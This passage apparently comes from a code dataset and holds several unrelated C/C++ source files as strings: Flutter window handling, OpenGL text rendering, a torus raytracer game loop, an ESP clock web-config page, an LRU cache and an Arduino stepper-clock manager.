flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"Text_Render.h\"\nextern unsigned int TVAO, TVBO;\n\nvoid Text::RenderText(Shader& shader, std::string text, float x, float y, float scale, glm::vec3 color)\n{\n\tscale = scale * 48.0f / 256.0f;\n\tfloat copyX = x;\n\t// activate corresponding render state\t\n\tshader.use();\n\tglUniform3f(glGetUniformLocation(shader.ID, \"textColor\"), color.x, color.y, color.z);\n\tglActiveTexture(GL_TEXTURE0);\n\tglBindTexture(GL_TEXTURE_2D_ARRAY, textureArray);\n\tglBindVertexArray(TVAO);\n\t//glBindBuffer(GL_ARRAY_BUFFER, TVBO);\n\n\tint workingIndex = 0;\n\t// iterate through all characters\n\tstd::string::const_iterator c;\n\tfor (c = text.begin(); c != text.end(); c++)\n\t{\n\n\t\tCharacter ch = Characters[*c];\n\n\t\tif (*c == '\\n') {\n\t\t\ty -= ((ch.Size.y)) * 1.3 * scale;\n\t\t\tx = copyX;\n\t\t}\n\t\telse if (*c == ' ') {\n\t\t\tx += (ch.Advance >> 6) * scale;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfloat xpos = x + ch.Bearing.x * scale;\n\t\t\tfloat ypos = y - (256 - ch.Bearing.y) * scale;\n\n\t\t\tT[workingIndex] = glm::translate(glm::mat4(1.0f), glm::vec3(xpos, ypos, 0)) * glm::scale(glm::mat4(1.0f), glm::vec3(256 * scale, 256 * scale, 0));\n\t\t\tletterMap[workingIndex] = ch.TextureID;\n\n\t\t\t// now advance cursors for next glyph (note that advance is number of 1/64 pixels)\n\t\t\tx += (ch.Advance >> 6) * scale; // bitshift by 6 to get value in pixels (2^6 = 64 (divide amount of 1/64th pixels by 64 to get amount of pixels))\n\t\t\tworkingIndex++;\n\t\t\tif (workingIndex == ARRAY_LIMIT - 1) {\n\t\t\t\tTextRenderCall(workingIndex, shader.ID);\n\t\t\t\tworkingIndex = 0;\n\t\t\t}\n\t\t}\n\n\n\t}\n\tTextRenderCall(workingIndex, shader.ID);\n\n\tglBindBuffer(GL_ARRAY_BUFFER, 0);\n\tglBindVertexArray(0);\n\tglBindTexture(GL_TEXTURE_2D_ARRAY, 0);\n\n}\n\nvoid Text::TextRenderCall(int length, GLuint shader)\n{\n\tif (length != 0) {\n\t\tglUniformMatrix4fv(glGetUniformLocation(shader, \"transforms\"), length, GL_FALSE, &T[0][0][0]);\n\t\tglUniform1iv(glGetUniformLocation(shader, \"letterMap\"), length, &letterMap[0]);\n\t\tglDrawArraysInstanced(GL_TRIANGLE_STRIP, 0, 4, length);\n\t}\n\n}\n\nvoid Text::init()\n{\n\tFT_Library ft;\n\t// All functions return a value different than 0 whenever an error occurred\n\tif (FT_Init_FreeType(&ft))\n\t{\n\t\tstd::cout << \"ERROR::FREETYPE: Could not init FreeType Library\" << std::endl;\n\t\treturn;\n\t}\n\n\t// find path to font\n\tstd::string font_name = std::string(\"res/Fonts/PressStart2P-Regular.ttf\");\n\tif (font_name.empty())\n\t{\n\t\tstd::cout << \"ERROR::FREETYPE: Failed to load font_name\" << std::endl;\n\t\treturn;\n\t}\n\n\t// load font as face\n\tFT_Face face;\n\tif (FT_New_Face(ft, font_name.c_str(), 0, &face)) {\n\t\tstd::cout << \"ERROR::FREETYPE: Failed to load font\" << std::endl;\n\t\treturn;\n\t}\n\telse {\n\t\t// set size to load glyphs as\n\t\tFT_Set_Pixel_Sizes(face, 256, 256);\n\n\t\t// disable byte-alignment restriction\n\t\tglPixelStorei(GL_UNPACK_ALIGNMENT, 1);\n\n\t\tglGenTextures(1, &textureArray);\n\t\tglActiveTexture(GL_TEXTURE0);\n\t\tglBindTexture(GL_TEXTURE_2D_ARRAY, textureArray);\n\t\tglTexImage3D(GL_TEXTURE_2D_ARRAY, 0, GL_R8, 256, 256, 128, 0, GL_RED, GL_UNSIGNED_BYTE, 0);\n\n\t\t// load first 128 characters of ASCII set\n\t\tfor (unsigned char c = 0; c < 128; c++)\n\t\t{\n\t\t\t// Load character glyph \n\t\t\tif (FT_Load_Char(face, c, FT_LOAD_RENDER))\n\t\t\t{\n\t\t\t\tstd::cout << \"ERROR::FREETYTPE: Failed to load Glyph\" << std::endl;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tglTexSubImage3D(\n\t\t\t\tGL_TEXTURE_2D_ARRAY,\n\t\t\t\t0, 0, 0, int(c),\n\t\t\t\tface->glyph->bitmap.width,\n\t\t\t\tface->glyph->bitmap.rows, 1,\n\t\t\t\tGL_RED,\n\t\t\t\tGL_UNSIGNED_BYTE,\n\t\t\t\tface->glyph->bitmap.buffer\n\t\t\t);\n\t\t\t// set texture options\n\t\t\tglTexParameteri(GL_TEXTURE_2D_ARRAY, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);\n\t\t\tglTexParameteri(GL_TEXTURE_2D_ARRAY, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);\n\t\t\tglTexParameteri(GL_TEXTURE_2D_ARRAY, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n\t\t\tglTexParameteri(GL_TEXTURE_2D_ARRAY, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\t\t\t// now store character for later use\n\t\t\tCharacter character = {\n\t\t\t\tint(c),\n\t\t\t\tglm::ivec2(face->glyph->bitmap.width, face->glyph->bitmap.rows),\n\t\t\t\tglm::ivec2(face->glyph->bitmap_left, face->glyph->bitmap_top),\n\t\t\t\tstatic_cast<unsigned int>(face->glyph->advance.x)\n\t\t\t};\n\t\t\tCharacters.insert(std::pair<char, Character>(c, character));\n\t\t}\n\t\tglBindTexture(GL_TEXTURE_2D_ARRAY, 0);\n\t}\n\t// destroy FreeType once we're finished\n\tFT_Done_Face(face);\n\tFT_Done_FreeType(ft);\n}\n",
    "#define _USE_MATH_DEFINES\r\n\r\n#include <SFML/Graphics.hpp>\r\n#include \"windows.h\" \r\n\r\n\r\nvoid cudathingy(uint8_t* pixels, double pos0, double pos1, double pos2, double vec0, double vec1, double vec2, double addy0, double addy1, double addy2, double addz0, double addz1, double addz2, bool inside, double alpha, double beta, double bigr, double r, bool other, double dx, double dy, double dz, int currx, int curry, int currz, int nbx, int nby, int nbz, bool* blocks1, bool* blocks2, bool rem, bool blockrand, bool reset);\r\nvoid cudaInit();\r\nvoid cudaExit();\r\n\r\ndouble toruscoll2(double a, double b, double c, double d, double e, double f, double m, double n);\r\ndouble solvequartic2(double a0, double b0, double c0, double d0, double e0);\r\nvoid tormat2(double phi, double theta, double* mat);\r\ndouble matdet2(double* m);\r\nvoid matinv2(double* m, double* res);\r\nvoid matmult2(double* m1, double* m2, double* res);\r\nvoid matact2(double* m, double vecn0, double vecn1, double vecn2, double* nvecn);\r\nvoid matflipcpu(double* m, double* res);\r\nvoid matflip2cpu(double* m, double* res);\r\nvoid setblockscpu(bool* blocks1, bool* blocks2);\r\nvoid setblocksrandcpu(bool* blocks1, bool* blocks2);\r\n\r\nstatic bool blocks1[30 * 30 * 30]{};\r\nstatic bool blocks2[30 * 30 * 30]{};\r\n\r\nint main()\r\n{\r\n    ShowWindow(GetConsoleWindow(), SW_HIDE);\r\n\t//ShowWindow(GetConsoleWindow(), SW_SHOW);\r\n\r\n\tdouble r = 1.0;\r\n\tdouble bigr = 1.5;\r\n\r\n\tdouble roomsize = 10.0;\r\n\tdouble schecker = 1.0;\r\n\tdouble dist = 2.0;\r\n\tdouble sqsz = 0.01 / 4;\r\n\tdouble speed = 0.01;\r\n\tdouble alpha = 1.0;\r\n\tdouble beta = 5.0;\r\n\r\n\r\n\tdouble alpha2 = 1.0;\r\n\tdouble beta2 = beta - alpha;\r\n\r\n\r\n\tdouble outangle=0;\r\n\r\n\tbool other = false;\r\n\r\n\tdouble anglex, angley;\r\n\tdouble xl;\r\n\tdouble dotp;\r\n\r\n\tdouble vl, geoang;\r\n\r\n\tdouble tmppos0, tmppos1, tmppos2, tmpx00, tmpx01, tmpx02, tmpx10, tmpx11, tmpx12, tmpx20, tmpx21, tmpx22;\r\n\r\n\tbool inside = false;\r\n\t\r\n\tbool reset = false;\r\n\r\n\r\n    int mousx, mousy, centralx, centraly;\r\n\r\n    double pos0, pos1, pos2;\r\n    double vec0, vec1, vec2;\r\n    double addy0, addy1, addy2;\r\n    double addz0, addz1, addz2;\r\n    double x00, x01, x02;\r\n    double x10, x11, x12;\r\n    double x20, x21, x22;\r\n    double multy = (1 - 1920) * sqsz / 2;\r\n    double multz = (1080-1) * sqsz / 2;\r\n\r\n\r\n    double newx00, newx01, newx02;\r\n    double newx10, newx11, newx12;\r\n    double newx20, newx21, newx22;\r\n\r\n\tdouble torcoll;\r\n\tdouble rayon;\r\n\tdouble newang;\r\n\tdouble guder;\r\n\tdouble distrem;\r\n\r\n\r\n\r\n\tdouble proj0, proj1;\r\n\r\n\tdouble tor0, tor1, tor2, xyvec, theta, phi;\r\n\tdouble mat1[9]{};\r\n\tdouble mat[9]{};\r\n\tdouble nvecn[3]{};\r\n\tdouble inv[9]{};\r\n\tdouble npos[3]{};\r\n\t\r\n\tint nbx = 30;\r\n\tint nby = 30;\r\n\tint nbz = 30;\r\n\r\n\tdouble dx = 2.0*M_PI*bigr / nbx;\r\n\tdouble dy = 2.0 * M_PI * r / nby;\r\n\tdouble dz = (beta - alpha) / nbz;\r\n\tint currx=0, curry=0, currz=0;\r\n\r\n    bool focus = true;\r\n\r\n\tbool blockrand = false;\r\n\tbool tmpinside, tmpother;\r\n\tbool rem = false;\r\n\r\n\r\n\tsetblockscpu(blocks1, blocks2);\r\n\r\n   //sf::RenderWindow window(sf::VideoMode(1920, 1080, 32), \"Torus Minecraft - Press ESC to stop\", sf::Style::Titlebar | sf::Style::Close);\r\n\tsf::RenderWindow window(sf::VideoMode(1920, 1080, 32), \"Torus Minecraft - Press ESC to stop\", sf::Style::Fullscreen);\r\n\tsf::Texture texture;\r\n    sf::Sprite sprite;\r\n    sf::Uint8* pixels = new sf::Uint8[1920 * 1080 * 4];\r\n    sf::Vector2i winpos;\r\n\r\n    cudaInit();\r\n    texture.create(1920, 1080);\r\n    window.setMouseCursorVisible(false);\r\n\r\n\tx00 = 0.0; x01 = 0.0; x02 = -1.0;\r\n\tx10 = 0.0; x11 = 1.0; x12 = 0.0;\r\n\tx20 = 1.0; x21 = 0.0; x22 = 0.0;\r\n\tpos0 = 0.0; pos1 = 0.0; pos2 = 7.93;\r\n\r\n    winpos = window.getPosition();\r\n    SetCursorPos(winpos.x + 1920 / 2, winpos.y + 1080 / 2);\r\n   \r\n    while (window.isOpen())\r\n    {\r\n        //Sleep(1);\r\n        sf::Event event;\r\n\t\t\r\n\t\twhile (window.pollEvent(event))\r\n\t\t{\r\n\t\t\tif (focus && event.type == sf::Event::KeyPressed && event.key.code == sf::Keyboard::J)\r\n\t\t\t{\r\n\t\t\t\tsetblocksrandcpu(blocks1,blocks2);\r\n\t\t\t\tblockrand = true;\r\n\t\t\t}\r\n\r\n\t\t\tif (event.type == sf::Event::Closed)\r\n\t\t\t\twindow.close();\r\n\r\n\t\t\tif (focus && event.type == sf::Event::MouseMoved)\r\n\t\t\t{\r\n\t\t\t\tPOINT p;\r\n\t\t\t\tGetCursorPos(&p);\r\n\t\t\t\twinpos = window.getPosition();\r\n\t\t\t\tcentralx = winpos.x + 1920 / 2;\r\n\t\t\t\tcentraly = winpos.y + 1080 / 2;\r\n\t\t\t\tSetCursorPos(centralx, centraly);\r\n\r\n\t\t\t\tmousx = p.x - centralx;\r\n\t\t\t\tmousy = p.y - centraly;\r\n\r\n\t\t\t\tanglex = 0.002 * mousx;\r\n\t\t\t\tangley = 0.002 * mousy;\r\n\r\n\t\t\t\tif (anglex < 0) anglex *= -1;\r\n\t\t\t\tif (angley < 0) angley *= -1;\r\n\r\n\r\n\t\t\t\tif (mousx > 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tnewx00 = x00 * cos(anglex) + sin(anglex) * x10;\r\n\t\t\t\t\tnewx10 = x10 * cos(anglex) - sin(anglex) * x00;\r\n\t\t\t\t\tx00 = newx00;\r\n\t\t\t\t\tx10 = newx10;\r\n\r\n\t\t\t\t\tnewx01 = x01 * cos(anglex) + sin(anglex) * x11;\r\n\t\t\t\t\tnewx11 = x11 * cos(anglex) - sin(anglex) * x01;\r\n\t\t\t\t\tx01 = newx01;\r\n\t\t\t\t\tx11 = newx11;\r\n\r\n\t\t\t\t\tnewx02 = x02 * cos(anglex) + sin(anglex) * x12;\r\n\t\t\t\t\tnewx12 = x12 * cos(anglex) - sin(anglex) * x02;\r\n\t\t\t\t\tx02 = newx02;\r\n\t\t\t\t\tx12 = newx12;\r\n\t\t\t\t}\r\n\t\t\t\telse if ",
    "#include \"EEPROMConfig.h\"\r\n#include \"web.h\"\r\n#include <regex>\r\n\r\nextern EEPROMConfig config;\r\nextern const char* endMarker;\r\n\r\nconst char* getTemplateString(const char* key, const char* name2html[][2]) {\r\n  // n^2 but hey ho\r\n  for (int i=0; strcmp(endMarker, name2html[i][0]) != 0; i++) {\r\n    if (strcmp(name2html[i][0], key) == 0) {\r\n      return name2html[i][1];\r\n    }\r\n  }\r\n\r\n  return endMarker;\r\n}\r\n\r\n/**\r\n * Render one item\r\n */\r\nvoid render(AsyncResponseStream *response, BaseConfigItem* item, const char* htmlTemplate) {\r\n  // The HTML element template we are trying to render\r\n  String html = htmlTemplate;\r\n\r\n  // Get the item value as a string (as everything in HTML is a string)\r\n  String itemValue = item->toString();\r\n\r\n  // This is for HTML controls that use the 'selected' property\r\n  // We want to replace %selected==some value% with 'selected' if itemValue is 'some value'\r\n  String selected = \"%selected==\" + itemValue + \"%\";\r\n  html.replace(selected, \"selected\");\r\n\r\n  // Same, but for HTML controls that use the 'checked' property. Sigh.\r\n  selected = \"%checked==\" + itemValue + \"%\";\r\n  html.replace(selected, \"checked\");\r\n\r\n  // Now replace '{v}' in the template with itemValue, if '{v}' is in the template\r\n  html.replace(\"{v}\", itemValue);\r\n\r\n  // Now we want to get rid of all the %selected==some other value% strings\r\n  std::regex pattern(\"%selected==[^%]+%\");\r\n  std::string result = std::regex_replace(html.c_str(), pattern, \"\");\r\n\r\n  // Same for checked\r\n  pattern = \"%checked==[^%]+%\";\r\n  result = std::regex_replace(result, pattern, \"\");\r\n\r\n  // Finally send this string to the browser\r\n  response->printf(result.c_str());\r\n}\r\n\r\n/**\r\n * Render the whole root page\r\n */\r\nvoid handleRoot(AsyncWebServerRequest *request, BaseConfigItem* rootConfig, const char* name2html[][2]) {\r\n  Serial.println(\"Handling /\");\r\n\tAsyncResponseStream *response = request->beginResponseStream(\"text/html\");\r\n\r\n  // Send everything up to the body\r\n\tresponse->print(R_SCALES_WEB_HTTP_HEAD);\r\n\tresponse->print(R_SCALES_WEB_HTTP_SCRIPT);\r\n\tresponse->print(R_SCALES_WEB_HTTP_STYLE);\r\n\tresponse->print(R_SCALES_WEB_HTTP_HEAD_END);\r\n\r\n  // Send anything we want at the top of the page\r\n\tresponse->print(\"<h1>\");\r\n\tresponse->print(\"SmartSocket 12 digit Clock\");\r\n\tresponse->print(\"</h1>\");\r\n\r\n  // Send the form that will end up POSTing to /save\r\n  response->print(R_SCALES_WEB_HTTP_FORM_START);\r\n\r\n  // Send all the elements in the form\r\n  for (int i=0; strcmp(endMarker, name2html[i][0]) != 0; i++) {\r\n    BaseConfigItem* item = rootConfig->get(name2html[i][0]);\r\n    if (item != 0) {\r\n      render(response, item, name2html[i][1]);\r\n    }\r\n  }\r\n\r\n  // Done with the form\r\n  response->print(R_SCALES_WEB_HTTP_FORM_END);\r\n\r\n  // We could send some more HTML that we want at the end of the page here\r\n\r\n  response->print(\"<br>\");\r\n\r\n  response->print(\"- 2024 - https://www.panaplex.co.uk\");\r\n\r\n  // Finish up the web page\r\n\tresponse->print(R_SCALES_WEB_HTTP_END);\r\n\r\n  // Send it all to the browser\r\n\trequest->send(response);\r\n}\r\n\r\n/**\r\n * The root page does a POST to http://<ip address>/save. Extract all the form\r\n * values and send a re-direct to a page that just says 'saved...'\r\n */\r\n\r\nvoid handleSave(AsyncWebServerRequest *request, BaseConfigItem* rootConfig) {\r\n  // Loop through all the config items\r\n  rootConfig->forEach([request](BaseConfigItem& item) {\r\n\r\n    // If the POST from the browser has a value for this config item...\r\n    if(request->hasParam(item.name, true)) {\r\n      // Retrieve value from POST...\r\n      const char* value = request->getParam(item.name, true)->value().c_str();\r\n      Serial.printf(\"POST[%s]: %s\\n\", item.name, value);\r\n\r\n      // And set the config item value\r\n      item.fromString(value);\r\n    } else {\r\n      // Sigh. If an HTML checkbox is not checked, the POST won't contain any value for it,\r\n      // so we assume that it was unchecked and we further assume that the config item\r\n      // is a boolean that should be set to false\r\n      item.fromString(\"false\");\r\n    }\r\n\r\n    // Mark the config item to be saved to EEPROM\r\n    item.put();\r\n  });\r\n\r\n  // Save all the config items to EEPROM\r\n  config.commit();\r\n\r\n  // Display the 'Saved...' message for a short time\r\n  request->redirect(\"/saved\");\r\n}\r\n\r\n\r\n/**\r\n * Display 'saved...' for 3 seconds then redirect back to root\r\n */\r\nvoid handleSaved(AsyncWebServerRequest *request, BaseConfigItem* rootConfig) {\r\n\tAsyncResponseStream *response = request->beginResponseStream(\"text/html\");\r\n\r\n  // This R\"(...)\" syntax is a string literal. Anything between those brackets is used verbatim, newlines and all\r\n\tresponse->print(R\"(\r\n    <html lang=\"en\">\r\n    <head>\r\n      <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, user-scalable=no\"/>\r\n      <meta http-equiv=\"refresh\" content=\"3; url=/\" />\r\n      <title>Panaplex Clock</title>\r\n    </head>\r\n    <body>\r\n    <p style=\"text-align: center;;font-family:verdana;font-size:1em;\">Saved...</p>\r\n    </body>\r\n    </html>\r\n    )\"\r\n ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <unordered_map>\n#include <list>\n#include <mutex>\n#include <memory>\n\ntemplate<typename KeyType, typename ValueType>\nclass LRUCache {\npublic:\n    // Constructor to initialize the cache with a given capacity\n    // Prevents compiler from using the constructor for implicit conversions\n    // Helps prevent accidental type conversions that might lead to bugs\n    explicit LRUCache(size_t size) : capacity(size) {}\n\n    // Function to retrieve a value from the cache\n    // Passed as const ref with '&' because there is no need to modify the object\n    // Also copying is too \"expensive\". Using the & ref ensures that the function does not alter the data.\n    // We do this because we don't want the program to alter the \"keys\" generated.\n    ValueType get(const KeyType& key) { \n        // Lock for thread safety, prevents concurrent modification during the fetch\n\tstd::lock_guard<std::mutex> lock(cache_mutex);\n        auto it = cache_map.find(key);  // Attempt to find the key in the hash map\n        if (it == cache_map.end()) {\n            throw std::range_error(\"Key not found\");  // Key not found, throw exception\n        }\n        // Moves the accessed node to the front of the list to mark it as most recently used\n        usage_list.splice(usage_list.begin(), usage_list, it->second);\n        return it->second->second;  // Return the value associated with the key\n    }\n\n    // Function to insert or update a value in the cache\n    // If cache is full, it evicts the LRU item\n    // New/updated item placed at the front of usage list\n    void put(const KeyType& key, const ValueType& value) {\n        // Lock for thread safety, ensures cache state is not corrupted by concurrent accesses and modifications\n\tstd::lock_guard<std::mutex> lock(cache_mutex);\n        auto it = cache_map.find(key);  // Check if key already exists in the cache\n        if (it != cache_map.end()) {\n            // If key exists, moves to the front to mark as most recently used\n            usage_list.splice(usage_list.begin(), usage_list, it->second);\n            it->second->second = value;  // Update the value\n            return;\n        }\n\n        // If the cache is full, we need to evict the least recently used item\n        if (usage_list.size() == capacity) {\n            auto last = usage_list.end();\n            last--;\n            cache_map.erase(last->first);  // Remove from map\n            usage_list.pop_back();  // Remove from list\n        }\n\n        // Insert the new key-value pair at the front of the list\n        usage_list.emplace_front(key, value);\n        cache_map[key] = usage_list.begin();  // Update map to point to the new element in the list\n    }\n\n    // Function to remove an object from the cache if it exists\n    void erase(const KeyType& key) {\n        // Lock to ensure thread safety\n\t// Ensures erase ops are performed safely w/o interference from other threads accessing/modifying data\n\tstd::lock_guard<std::mutex> lock(cache_mutex);\n        auto it = cache_map.find(key);  // Find the key in the map\n        if (it != cache_map.end()) {\n            usage_list.erase(it->second);  // Remove from list\n            cache_map.erase(it);  // Remove from map\n        }\n    }\n\n    // Function to dynamically adjust the cache's capacity\n    // Evicts least recently used items until size matches new capacity\n    void resize(size_t new_capacity) {\n        // Lock to ensure thread safety\n\t// Ensures the resizing cache des not conflict with other ops happening concurrently\n\tstd::lock_guard<std::mutex> lock(cache_mutex);\n        while (usage_list.size() > new_capacity) {  // If current size is larger than new capacity, reduce size\n            auto last = usage_list.end();\n            last--;\n            cache_map.erase(last->first);  // Remove least recently used items\n            usage_list.pop_back();\n        }\n        capacity = new_capacity;  // Set the new capacity\n    }\n\nprivate:\n    size_t capacity;  // Maximum number of elements in the cache\n    // List to track the least recent to most recently used objects\n    // Used doubly linked list to maintain the order from most recently used objects\n    // Allows O(1) complexity for adding/removing elements from the end of list\n    // This is crucial when using the LRU policy.\n    std::list<std::pair<KeyType, ValueType>> usage_list;  \n    // Map to quickly lookup elements in the list\n    // Links keys to iterators of their corresponding positions in the usage_list\n    // Enables 0(1) avg time complexity for accessing elements\n    std::unordered_map<KeyType, typename std::list<std::pair<KeyType, ValueType>>::iterator> cache_map;\n    std::mutex cache_mutex;  // Mutex to make class thread-safe\n};\n\nint main() {\n    LRUCache<int, std::string> cache(2);  // Create a cache for up to 2 items\n    cache.put(1, \"data1\");  // Insert item with key 1\n    cache.put(2, \"data2\");  // Insert item with key 2\n    try {\n        std::cout << \"1 -> \" << cache.get(1) << std::endl;  // Access item with k",
    "#include <Arduino.h>\n\n#include \"ClockManager.h\"\n\nvoid ClockManager::begin() {\n  _stepper.begin();\n}\n\nvoid ClockManager::start_ntp() {\n  configTime(0, 0, \"pool.ntp.org\");\n\n  struct tm timeinfo;\n  if (!getLocalTime(&timeinfo)) {\n    (*_logger)(\"Failed to obtain time\");\n    return;\n  }\n\n  time_source = SNTP;\n\n  log_current_time();\n  set_displayed_time(timeinfo.tm_hour, timeinfo.tm_min);\n  _state = RUN;\n}\n\nvoid ClockManager::tick() {\n  if (_state == CALIBRATE_HOUR) {\n    (*_logger)(\"Calibrate hour\");\n\n    _calibrating = true;\n    _stepper.calibrate_hour(_calibrating);\n\n    (*_logger)(\"Calibration done\");\n\n    return;\n  }\n\n  if (_state == CALIBRATE_MINUTE) {\n    (*_logger)(\"Calibrate minute\");\n\n    _calibrating = true;\n    _stepper.calibrate_minute(_calibrating);\n\n    (*_logger)(\"Calibration done\");\n\n    return;\n  }\n\n  if (_state == DEMO) {\n    _stepper.step(true, false);\n    delay(500);\n    _stepper.step(true, true);\n    delay(500);\n    _stepper.step(false, true);\n\n    adjust_displayed_hour(2);\n    adjust_displayed_minute(2);\n\n    return;\n  }\n\n  if (_state == SET_MINUTES) {\n    set_minutes();\n    _state = RUN;\n\n    return;\n  }\n\n  sync_to_current_time();\n}\n\nvoid ClockManager::toggle_demo() {\n  _calibrating = false;\n  if (_state == DEMO) {\n    (*_logger)(\"End demo\");\n    _state = RUN;\n  } else {\n    (*_logger)(\"Start demo\");\n    _state = DEMO;\n  }\n}\n\nvoid ClockManager::set_displayed_time(int hour, int minute) {\n  _displayedHour = hour;\n  _displayedMinute = minute;\n\n  (*_logger)(\"Set displayed time to %02d:%02d\\n\", _displayedHour, _displayedMinute);\n}\n\nvoid ClockManager::adjust_displayed_hour(int count) {\n  _displayedHour = _displayedHour + count;\n  if (_displayedHour < 0)\n    _displayedHour += 24;\n  else if (_displayedHour >= 24)\n    _displayedHour -= 24;\n}\n\nvoid ClockManager::adjust_displayed_minute(int count) {\n  _displayedMinute = _displayedMinute + count;\n  if (_displayedMinute < 0)\n    _displayedMinute += 60;\n  else if (_displayedMinute >= 60)\n    _displayedMinute -= 60;\n}\n\nvoid ClockManager::set_current_time(int hour, int minute, int second) {\n  struct tm timeinfo;\n  time_t now = time(0);\n  localtime_r(&now, &timeinfo);\n\n  timeinfo.tm_hour = hour;\n  timeinfo.tm_min = minute;\n  timeinfo.tm_sec = second;\n  timeinfo.tm_isdst = -1;\n\n  time_t t = mktime(&timeinfo);\n  struct timeval new_time = { .tv_sec = t };\n  settimeofday(&new_time, NULL);\n\n  log_current_time();\n}\n\nvoid ClockManager::set_current_date(int day, int month, int year) {\n  struct tm timeinfo;\n  time_t now = time(0);\n  localtime_r(&now, &timeinfo);\n\n  timeinfo.tm_mday = day;\n  timeinfo.tm_mon = month - 1;\n  timeinfo.tm_year = year - 1900;\n  timeinfo.tm_isdst = -1;\n\n  time_t t = mktime(&timeinfo);\n  struct timeval new_time = { .tv_sec = t };\n  settimeofday(&new_time, NULL);\n\n  log_current_time();\n}\n\nvoid ClockManager::log_current_time() {\n  struct tm timeinfo;\n  time_t now = time(0);\n  localtime_r(&now, &timeinfo);\n  char buffer[32];\n  strftime(buffer, 31, \"%Y-%m-%d %H:%M:%S %z\", &timeinfo);\n  (*_logger)(\"Current time is %s\", buffer);\n}\n\nvoid ClockManager::sync_to_current_time() {\n  struct tm timeinfo;\n  time_t now = time(0);\n  localtime_r(&now, &timeinfo);\n\n  int currentHour = timeinfo.tm_hour;\n  int currentMinute = timeinfo.tm_min;\n\n  if (currentHour == _displayedHour && currentMinute == _displayedMinute) {\n    return;\n  }\n\n  int offsetHour = currentHour - _displayedHour;\n  if (offsetHour < 0)\n    offsetHour += 24;\n  else if (offsetHour >= 24)\n    offsetHour -= 24;\n\n  int offsetMinute = currentMinute - _displayedMinute;\n  if (offsetMinute < 0)\n    offsetMinute += 60;\n  else if (offsetMinute >= 60)\n    offsetMinute -= 60;\n\n  if (offsetMinute > 50) {\n    offsetMinute = 0;\n  }\n\n  if(offsetHour == 0 && offsetMinute == 0) {\n    return;\n  }\n\n  (*_logger)(\"%02d:%02d -> %02d:%02d\", _displayedHour, _displayedMinute, currentHour, currentMinute);\n\n  while (offsetHour > 0 && offsetMinute > 0) {\n    (*_logger)(\"  Advance hour and minute\");\n    offsetHour--;\n    adjust_displayed_hour(1);\n    offsetMinute--;\n    adjust_displayed_minute(1);\n\n    _stepper.step(true, true);\n  }\n\n  while (offsetHour > 0) {\n    (*_logger)(\"  Advance hour\");\n    offsetHour--;\n    adjust_displayed_hour(1);\n\n    _stepper.step(true, false);\n  }\n\n  while (offsetMinute > 0) {\n    (*_logger)(\"  Advance minute\");\n    offsetMinute--;\n    adjust_displayed_minute(1);\n\n    _stepper.step(false, true);\n  }\n}\n\nvoid ClockManager::set_minutes() {\n  (*_logger)(\"Setting minutes\");\n\n  _flagCurrentMinute = false;\n  _flagZeroMinute = false;\n\n  int currentIndex = -1;\n  int zeroIndex = -1;\n  bool timeKnown = (time_source != NONE && time_source != BUTTONS);\n\n  unsigned long startMillis = millis();\n  int currentMinuteAtStart = 0;\n  if (timeKnown) {\n    struct tm timeinfo;\n    time_t now = time(0);\n    localtime_r(&now, &timeinfo);      \n    currentMinuteAtStart = timeinfo.tm_min;\n  }\n\n  for (int index = 1; index <= 60; index++) {\n    _stepper.step(false, true);\n    adjust_displayed_minute(1);\n\n    (*_logger)(\" ",
